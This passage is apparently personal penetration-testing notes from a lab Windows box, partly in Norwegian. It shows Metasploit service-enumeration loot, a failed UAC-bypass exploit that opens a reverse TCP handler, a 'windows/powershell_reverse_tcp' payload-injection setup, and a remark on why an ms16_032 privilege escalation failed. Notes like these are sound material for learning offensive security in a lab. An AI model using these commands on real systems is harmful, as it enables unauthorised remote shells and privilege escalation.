 ehRecvr                         NT AUTHORITY\networkService  Manual    C:\Windows\ehome\ehRecvr.exe  
 ehSched                         NT AUTHORITY\networkService  Manual    C:\Windows\ehome\ehsched.exe  
 eventlog                        NT AUTHORITY\LocalService    Auto      C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted  
 fdPHost                         NT AUTHORITY\LocalService    Manual    C:\Windows\system32\svchost.exe -k LocalService  
 ftpsvc                          LocalSystem                  Auto      C:\Windows\system32\svchost.exe -k ftpsvc  
 gpsvc                           LocalSystem                  Auto      C:\Windows\system32\svchost.exe -k netsvcs  
 hidserv                         LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted  
 hkmsvc                          localSystem                  Manual    C:\Windows\System32\svchost.exe -k netsvcs  
 idsvc                           LocalSystem                  Manual    "C:\Windows\Microsoft.NET\Framework\v3.0\Windows Communication Foundation\infocard.exe"  
 iphlpsvc                        LocalSystem                  Auto      C:\Windows\System32\svchost.exe -k NetSvcs  
 lltdsvc                         NT AUTHORITY\LocalService    Manual    C:\Windows\System32\svchost.exe -k LocalService  
 lmhosts                         NT AUTHORITY\LocalService    Auto      C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted  
 msiserver                       LocalSystem                  Manual    C:\Windows\system32\msiexec.exe /V  
 napagent                        NT AUTHORITY\NetworkService  Manual    C:\Windows\System32\svchost.exe -k NetworkService  
 netprofm                        NT AUTHORITY\LocalService    Manual    C:\Windows\System32\svchost.exe -k LocalService  
 nsi                             NT Authority\LocalService    Auto      C:\Windows\system32\svchost.exe -k LocalService  
 p2pimsvc                        NT AUTHORITY\LocalService    Manual    C:\Windows\System32\svchost.exe -k LocalServicePeerNet  
 p2psvc                          NT AUTHORITY\LocalService    Manual    C:\Windows\System32\svchost.exe -k LocalServicePeerNet  
 pla                             NT AUTHORITY\LocalService    Manual    %SystemRoot%\System32\svchost.exe -k LocalServiceNoNetwork  
 seclogon                        LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k netsvcs  
 sppsvc                          NT AUTHORITY\NetworkService  Auto      C:\Windows\system32\sppsvc.exe  
 sppuinotify                     NT AUTHORITY\LocalService    Manual    C:\Windows\system32\svchost.exe -k LocalService  
 swprv                           LocalSystem                  Manual    C:\Windows\System32\svchost.exe -k swprv  
 vds                             LocalSystem                  Manual    C:\Windows\System32\vds.exe  
 wbengine                        localSystem                  Manual    "C:\Windows\system32\wbengine.exe"  
 wercplsupport                   localSystem                  Manual    C:\Windows\System32\svchost.exe -k netsvcs  
 wmiApSrv                        localSystem                  Manual    C:\Windows\system32\wbem\WmiApSrv.exe  
 wscsvc                          NT AUTHORITY\LocalService    Auto      C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted  
 wuauserv                        LocalSystem                  Auto      C:\Windows\system32\svchost.exe -k netsvcs  
 wudfsvc                         LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted

\[+\] Loot file stored in: /root/.msf4/loot/20170530070020\_default\_10.10.10.5\_windows.services\_595828.txt  
\[\*\] Post module execution completed

**forsøkte å bypasse uac**  
msf exploit\(bypassuac\) &gt; exploit

\[_\] Started reverse TCP handler on 10.0.0.8:4444  
\[_\] UAC is Enabled, checking level...  
\[+\] UAC is set to Default  
\[+\] BypassUAC can bypass this setting, continuing...  
\[-\] Exploit aborted due to failure: no-access: Not in admins group, cannot escalate with this module

**greide å få powershell**

```
use exploit/windows/local/payload_inject
set payload windows/powershell_reverse_tcp

exploit/windows/local/ms16_032_secondary_logon_handle_privesc funekr ikke fordi det bare er et ettkjerne vm. krever to kjerner
```

```

```



